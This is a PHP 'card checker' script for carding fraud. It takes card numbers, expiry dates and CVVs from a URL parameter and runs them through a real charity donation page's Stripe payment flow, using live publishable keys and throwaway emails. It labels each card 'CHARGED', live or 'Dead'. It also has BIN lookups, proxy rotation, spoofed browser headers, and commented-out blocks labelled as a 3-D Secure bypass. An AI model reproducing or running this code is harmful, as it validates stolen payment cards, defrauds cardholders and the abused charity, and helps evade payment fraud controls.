<?php

############Kingsahil##########
############[PHP SETUP]#############

          error_reporting(0);
          set_time_limit(0);
          error_reporting(0);
          date_default_timezone_set('America/Buenos_Aires');

          // https://www.gosh.org/_donate/?amount=1&frequency=single&campaign=1856

 

#########################[Functions + Lista]############################
         
          function multiexplode($delimiters, $string){
                  $one = str_replace($delimiters, $delimiters[0], $string);
                  $two = explode($delimiters[0], $one);
          return $two;}

                  $lista = $_GET['lista'];
                  $cc   = multiexplode(array(":", "|", " "), $lista)[0];
                  $mes  = multiexplode(array(":", "|", " "), $lista)[1];
                  $ano = multiexplode(array(":", "|", " "), $lista)[2];
                  $cvv  = multiexplode(array(":", "|", " "), $lista)[3];
                  
          function GetStr($string, $start, $end){
                  $str = explode($start, $string);
                  $str = explode($end, $str[1]);
          return $str[0];}

                  $amount = 'Charge : $'.rand(3,7).'.'.rand(01,99);
                  $amount2 = 'Not Charged';

          function value($str,$find_start,$find_end){
                  $start = @strpos($str,$find_start);
          if ($start === false){
          return "";}
                  $length = strlen($find_start);
                  $end    = strpos(substr($str,$start +$length),$find_end);
          return trim(substr($str,$start +$length,$end));}
          function mod($dividendo,$divisor){
          return round($dividendo - (floor($dividendo/$divisor)*$divisor));}

          function AllinOne($data = 42){
                return substr(strtolower(sprintf('%04X%04X-%04X-%04X-%04X-%04X%04X%04X%04X%04X', mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(16384, 20479), mt_rand(32768, 49151), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535))), 0, $data);};
           

#####################################

                  $guid = AllinOne();
                  $muid = AllinOne();
                  $sid = AllinOne();

#####################################
                  $time_on_page  = ucfirst(str_shuffle('67818'));
                  $z1  = substr($cc,0,3);
                  $z2  = substr($cc,3,6);

###################################[cs_live take]#####################
   $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://kwanda.co/api/donate/payment-intent');
        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
               'method: POST',
               'scheme: https',
               'accept: */*',
               'accept-language: en-US,en;q=0.9',
               'content-type: text/plain;charset=UTF-8',
               'origin: https://kwanda.co',
               'referer: https://kwanda.co/donate',
               'sec-fetch-dest: empty',
               'sec-fetch-mode: cors',
               'sec-fetch-site: same-origin',
               'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'',));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '{"email":"bevas33220@ezgiant.com","amount":"1"}');


               $get_cslive = curl_exec($ch);
// echo $get_cslive ;
            $clientSecret = 
    Getstr($get_cslive,'clientSecret":"','"');
// echo $clientSecret;
$pi =  Getstr($get_cslive,'clientSecret":"','_secret');
// echo $pi;


 //* Start of getting BIN Information *//

// Get the first 6 digits (BIN) of the credit card number
$bin = substr($credit_card, 0, 6);

// Lookup the BIN database from https://binlist.net/ with 5 retries
$max_attempts = 3; // maximum number of attempts to make
$attempt = 0; // current attempt number

$binlist_response = false;

while(!$binlist_response && $attempt <= $max_attempts) {
    $binlist_api_url = "https://lookup.binlist.net/" . $cc;
    $binlist_response = @file_get_contents($binlist_api_url); // use @ to suppress errors
    $binlist_data = json_decode($binlist_response, true);

    //if(!empty($binlist_data)) {
        // data found, break out of the loop
        //break;
    //}

    // increment attempt counter
    $attempt++;

    // wait for 1 second before sending the next request
    //sleep(1);
}

// check if valid data was found
if(!empty($binlist_data)) {
    $find_cc_country = isset($binlist_data['country']['alpha2']) ? $binlist_data['country']['alpha2'] : '';
    $cctype = isset($binlist_data['type']) ? $binlist_data['type'] : '';
    $find_bank_name = isset($binlist_data['bank']['name']) ? $binlist_data['bank']['name'] : '';

    if(!empty($find_cc_country)){
        $cc_country = "<span class='badge badge-secondary'>$find_cc_country</span>";
    }
    if(!empty($find_bank_name)){
        $bank_name = "<span class='badge badge-secondary'>$find_bank_name</span>";
    }
} else {
    // no valid data found after maximum attempts
    // handle error here, e.g. display an error message
}


// Check if the input is a CVV or CCN
#$cctype = (preg_match('/^\d{3,4}$/', $cc)) ? 'CVV' : ((preg_match('/^\d{12,19}$/', $cc)) ? 'CCN' : 'Unknown');

// Check if the card type is debit or credit
if(strtolower($cctype) == 'debit'){
  $cctype = '<span class="badge badge-secondary">Debit</span>';
} else if(strtolower($cctype) == 'credit'){
  $cctype = '<span class="badge badge-secondary">Credit Card</span>';
} else {
  $cctype = '';
}

// Check the card type
if (preg_match('/^4[0-9]{12}(?:[0-9]{3})?$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">Visa</span>';
} elseif (preg_match('/^5[1-5][0-9]{14}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">Mastercard</span>';
} elseif (preg_match('/^3[47][0-9]{13}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">American Express</span>';
} elseif (preg_match('/^6(?:011|5[0-9][0-9])[0-9]{12}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">Discover</span>';
} elseif (preg_match('/^(?:2131|1800|35\d{3})\d{11}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">JCB</span>';
} elseif (preg_match('/^3(?:0[0-5]|[68][0-9])[0-9]{11}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">Diners Club</span>';
} elseif (preg_match('/^(62|88)\d{16}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">UnionPay</span>';
} elseif (preg_match('/^(5[06789]|6)[0-9]{10,17}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">Maestro</span>';
} elseif (preg_match('/^4(026|17500|405|508|844|91[37])/', $cc)) {
    $scheme = '<span class="badge badge-secondary">Visa Electron</span>';
} elseif (preg_match('/^6[0-9]{15}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">RuPay</span>';
} else {
    $scheme = '';
}   
      
#########################[1 REQ]############################


        // $ch = curl_init();
        // curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
        // curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        // curl_setopt($ch, CURLOPT_HEADER, 0);
        // curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        //        'authority: api.stripe.com',
        //        'method: POST',
        //        'path: /v1/payment_methods',
        //        'scheme: https',
        //        'accept: application/json',
        //        'accept-language: en-US,en;q=0.9',
        //        'content-type: application/x-www-form-urlencoded',
        //        'origin: https://checkout.stripe.com',
        //        'referer: https://checkout.stripe.com/',
        //        'sec-fetch-dest: empty',
        //        'sec-fetch-mode: cors',
        //        'sec-fetch-site: same-origin',
        //        'sec-gpc: 1',
        //        'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'',));
        // curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        // curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        // curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        // curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        // curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]=Mie+smith&billing_details[email]=povehec542%40moneyzon.com&billing_details[address][country]=US&billing_details[address][line1]=123+Allen+Street&billing_details[address][city]=New+York&billing_details[address][postal_code]=10080&billing_details[address][state]=NY&guid=6a4546b5-e346-4b50-b0d8-d5d33a676a66f89bf6&muid=9432df02-eae5-45d2-bf29-156161e6a4458af1f6&sid=6269058b-4121-4d90-8769-526181d6dc1806b168&key=pk_live_51HP2WxDtYuzMl8oxGIjU2GakXYVkZvUJMOVRokOJ97g7VNGLb5FVP5CIRQjU5JnOcqeqW4XEFOp2rTNa92oTfRZ100avSDHKRk&payment_user_agent=stripe.js%2F66b9a6439%3B+stripe-js-v3%2F66b9a6439%3B+checkout');
        
        // $r1 = curl_exec($ch);
        // $id = Getstr($r1,'"id": "','"');

############################[2 Req]############################
 
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$pi.'/confirm');
        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
               'authority: api.stripe.com',
               'method: POST',
               'path: /v1/payment_intents/'.$pi.'/confirm',
               'scheme: https',
               'accept: application/json',
               'accept-language: en-US,en;q=0.9',
               'content-type: application/x-www-form-urlencoded',
               'origin: https://js.stripe.com',
               'referer: https://js.stripe.com/',
               'sec-fetch-dest: empty',
               'sec-fetch-mode: cors',
               'sec-fetch-site: same-origin',
               'sec-gpc: 1',
               'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'',));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=NA&payment_method_data[muid]=NA&payment_method_data[sid]=NA&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F1104f1bb4%3B+stripe-js-v3%2F1104f1bb4&payment_method_data[time_on_page]=450630&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_rbk4JfkOGoJDELjimly0ZCt300hVkrCWBy&client_secret='.$clientSecret.'');
        
        $r2 = curl_exec($ch);

// echo $r2;
      
//        $stripe_js = Getstr($r2,'"stripe_js": "','"');
//       $src = Getstr($r2,'"three_d_secure_2_source": "','"');
     
//      $client_secret = Getstr($r2,'"client_secret": "','"');
//     $pi = Getstr($r2,'"client_secret": "','_secret');
    

// #####################[3ds Bypass using url]#############
// if (strpos($r2, "https://hooks.stripe.com/redirect/authenticate/"))   
// {
//          $ch = curl_init();
//           $bin = substr($cc, 0,6);
//           curl_setopt($ch, CURLOPT_URL, ''.$stripe_js.'');
//           curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//           curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//           curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
//           curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//                   $r4 = curl_exec($ch);


$hydra = isset($_GET['hydra']) ? $_GET['hydra'] : '';
$ip = isset($_GET['ip']) ? $_GET['ip'] : '';
$ip_nums = array(
1 =>    ''
    );
$rotateips = $ip_nums[array_rand($ip_nums)];
$ip_accounts = array(
1 =>    ''
    );
$rotateaccounts = $ip_accounts[array_rand($ip_accounts)];
$proxy = !empty($ip) ? $ip : ''.$rotateips.'';
$proxyauth = !empty($hydra) ? $hydra : ''.$rotateaccounts.'';

list($cc, $mm, $yyyy, $cvv) = explode("|", preg_replace('/[^0-9|]+/', '', $_GET['cards']));
$scc = implode('+', str_split($cc, 4));
$m = ltrim($mm, "0"); $mm === "10" ? $m = "10" : $mm;
strlen($yyyy) == 2 ? $yyyy = '20' . $yyyy : null; $yy = substr($yyyy, 2,2);
$card = "$cc|$mm|$yy|$cvv";
$type = $cc[0] == '4' ? 'Visa' : 'Mastercard'; 

            
// }
// #####################[3ds Bypass using url]#############
// if (strpos($r2, "three_d_secure_2_source"))   
// {
//                 $ch = curl_init();
//         curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/3ds2/authenticate');
//         curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
//         curl_setopt($ch, CURLOPT_HEADER, 0);
//         curl_setopt($ch, CURLOPT_HTTPHEADER, array(
//                'authority: api.stripe.com',
//                'method: POST',
//                'path: /v1/3ds2/authenticate',
//                'scheme: https',
//                'accept: application/json',
//                'accept-language: en-US,en;q=0.9',
//                'content-type: application/x-www-form-urlencoded',
//                'origin: https://js.stripe.com',
//                'referer: https://js.stripe.com/',
//                'sec-fetch-dest: empty',
//                'sec-fetch-mode: cors',
//                'sec-fetch-site: same-origin',
//                'sec-gpc: 1',
//                'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'',));
//         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
//         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//         curl_setopt($ch, CURLOPT_POSTFIELDS, 'source='.$src.'&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-US%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22864%22%2C%22browserScreenWidth%22%3A%221536%22%2C%22browserTZ%22%3A%22-330%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F109.0.0.0+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=true&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=pk_live_51HP2WxDtYuzMl8oxGIjU2GakXYVkZvUJMOVRokOJ97g7VNGLb5FVP5CIRQjU5JnOcqeqW4XEFOp2rTNa92oTfRZ100avSDHKRk');
        
//         $srcresult = curl_exec($ch);
      
//   }
// ########################[result url]#####################

//     $ch = curl_init();
//           curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$pi.'?key=pk_live_51HP2WxDtYuzMl8oxGIjU2GakXYVkZvUJMOVRokOJ97g7VNGLb5FVP5CIRQjU5JnOcqeqW4XEFOp2rTNa92oTfRZ100avSDHKRk&is_stripe_sdk=false&client_secret='.$client_secret.'');
//           curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//           curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//           curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
//           curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//                   $result31 = curl_exec($ch);


########################[Responses]############################
///// [2REQ - RSOP]

if(strpos($r2,'"status": "succeeded')){
  $status = '#CHARGED';
  $cc_code = '『 CHARGE PASS✅= 』';
  $reqfind = '2 Req';
}

// elseif(strpos($result31,'Membership Confirmation')){
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31,'Thank you for your support')){
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31,'Thank you for your donation')){
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31,'/wishlist-member/?reg=')){
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31, 'Thank You')) {
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31, '\"success\":true')) {
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31, 'pass')) {
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31, 'wcf-key')) {
//  $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';

  
// }

elseif(strpos($r2, 'incorrect_zip')) {
  $status = '#CVV';
  $cc_code = '『 incorrect_zip ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, 'transaction_not_allowed')) {
  $status = '#CVV';
  $cc_code = '『 transaction_not_allowed ✅ 』';
  $reqfind = '2 Req';
}
elseif (strpos($r2,'Your card does not support this type of purchase.')) {
  $status = '#CVV';
  $cc_code = '『 Your card does not support this type of purchase ✅ 』';
  $reqfind = '2 Req';
}
// Add more conditions here...

else{
  $status = 'Dead❌';
  $cc_code = '『 Problem Not Detected From Your Cards 』';
  $reqfind = '2 Req';
}
$flags = [
    "\u{1F1E6}\u{1F1F7}", // United States flag
    "\u{1F1E8}\u{1F1F3}", // France flag
    "\u{1F1F5}\u{1F1F9}", // Russia flag
    "\u{1F1EA}\u{1F1F8}", // Germany flag
    "\u{1F1F3}\u{1F1FF}"  // China flag
];

// Generate a random index for flag
$randomFlagIndex = rand(0, count($flags) - 1);

// Get the random flag
$randomFlag = $flags[$randomFlagIndex];

// Generate a random IP address
$randomIP = rand(1, 255) . '.' . rand(0, 255) . '.' . rand(0, 255) . '.' . rand(0, 255);

// Output the random IP and flag
function generateRandomString($length) {
    $characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

$randomString = generateRandomString(10);
$nameAlias = generateRandomString(8);

$providers = array(
    'gmail.com',
    'yahoo.com',
    'hotmail.com'
);

$randomProviderIndex = rand(0, count($providers) - 1);
$domain = $providers[$randomProviderIndex];

$fakeEmail = $nameAlias . '@' . $domain;

//=======================[Responses-END]==============================//
echo '</br><b style="color: red;">IP : ' . $randomFlag . ' x ' . $randomIP . ' x '.$MADEBY.' ['.$status.'] '.$lista.' x '.$cc_code.''.$bindata1.'</b></br>';
echo '<span style="color: #000000; font-weight: bold; font-size: 11px; background-color: #f0f0f0;"><b>Email: <b>' . $fakeEmail .' x ' . $amount . '</b></b></span><br>';
echo '<span style="color: #000000; font-size: 11px; background-color: #ffffff;">Reason: ' . $reqfind . '</span><br>';
echo '<span style="color: #000000; font-weight: bold; font-size: 10px; background-color: #f0f0f0;"><b>Cards Type:</b> <b>' .$scheme . ' x ' .$cctype . '</b></span><br>';
echo '<span style="color: red; font-weight: bold; font-size: 10px; background-color: #ffffff; ">Status: '.$amount2.'</span><br><br>';
echo '<span style="color: #008000; font-weight: bold; font-size: 13px; background-color: #f0f0f0;">=[𓆩𝗫𝗲𝗿𝗿𝗼𝘅𓆪「Zone ↯]=</span><br>';
sleep(2);